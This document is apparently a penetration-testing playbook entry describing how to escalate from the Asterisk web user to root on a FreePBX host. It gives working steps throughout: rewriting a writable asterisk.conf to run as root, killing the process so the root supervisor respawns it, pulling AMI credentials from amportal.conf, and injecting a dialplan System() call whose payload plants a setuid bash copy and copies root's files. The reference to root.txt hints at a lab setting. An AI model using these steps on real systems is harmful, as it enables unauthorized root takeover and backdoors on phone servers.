# Asterisk `runuser` → root via safe_asterisk respawn

## When this applies

Foothold as the Asterisk/FreePBX web user (e.g. `asterisk`) on a Linux PBX, and:

- `/etc/asterisk/asterisk.conf` is **writable** by the foothold user (FreePBX often ships it owner/group-writable).
- The supervisor **`safe_asterisk` runs as root** — normal on a clean boot: the init script / `freepbx.service` starts it as root and it drops the `asterisk` binary to `runuser`. Check:
  ```bash
  ps -eo user,pid,ppid,cmd | grep -E 'safe_asterisk|/usr/sbin/asterisk -'
  ```
  Expect `root … safe_asterisk` as the parent of `asterisk` (uid = the web user).
- `AST_USER`/`AST_GROUP` in `/etc/sysconfig/asterisk` are **unset/empty** — so the binary starts without a `-U` override and honors `runuser` from `asterisk.conf`.

If `safe_asterisk` is itself running as the *unprivileged* user (not root), this won't fire — the host is likely in a degraded post-tamper / incomplete-boot state; a clean reboot/reset restores the root supervisor.

## Technique

1. Flip the run-user in the writable config. `sed -i` fails (the temp file needs a writable `/etc`); truncate+write the file you own instead:
   ```bash
   sed 's/^runuser = .*/runuser = root/; s/^rungroup = .*/rungroup = root/' /etc/asterisk/asterisk.conf > /tmp/ac
   cat /tmp/ac > /etc/asterisk/asterisk.conf
   ```
2. Crash the asterisk binary so the root supervisor respawns it honoring the new `runuser`:
   ```bash
   kill -9 $(pgrep -x asterisk)
   ```
   **Use SIGKILL, not SIGTERM.** SIGTERM makes Asterisk shut down gracefully; `safe_asterisk` reads a clean exit as an intentional stop and **exits itself** — you destroy the only root supervisor and can't recover without a reboot. SIGKILL is an abnormal exit, so `safe_asterisk` respawns the binary — now `asterisk` runs as **root**:
   ```bash
   ps -o user= -p $(pgrep -x asterisk)   # -> root
   ```

## Code-exec as root

Asterisk-as-root doesn't hand your web shell root directly — leverage it via the dialplan `System()` app over the AMI:

1. Creds from `/etc/amportal.conf` (`AMPMGRUSER`/`AMPMGRPASS`); `manager.conf` usually grants `system`.
2. Append a context to the **writable** `extensions_custom.conf`:
   ```
   [x]
   exten => s,1,System(/bin/bash /home/asterisk/.p.sh)
   exten => s,n,Hangup()
   ```
   (`.p.sh` = your root payload: `cp /bin/bash <shared>/.b; chmod 6755 <shared>/.b; cp /root/root.txt <shared>/...`)
3. Drive it over AMI (TCP `127.0.0.1:5038`) — login, then:
   ```
   Action: Command   → Command: dialplan reload
   Action: Originate → Channel: Local/s@x/n  Application: Wait  Data: 1  Async: true
   ```
   The Local channel enters `x,s,1` → `System()` runs your script as root.

## Gotchas (each cost real time)

- **systemd `PrivateTmp`**: httpd (the web shell) and asterisk each get a *private* `/tmp` — files written by one are invisible to the other (`System`/`AGI` logs *"File does not exist"*). Put the payload script **and its outputs** on a **shared** path (`/home/asterisk`, `/dev/shm`), never `/tmp`.
- **`.ctl` socket**: with asterisk running as root the control socket is often root-owned and not group-accessible, so `asterisk -rx …` fails — drive the AMI over TCP instead.
- **`func_shell` `SHELL()`** is blocked by `live_dangerously = no`; the **`System()` app is not** — prefer `System()` (or `AGI(<script>)` for a direct exec).
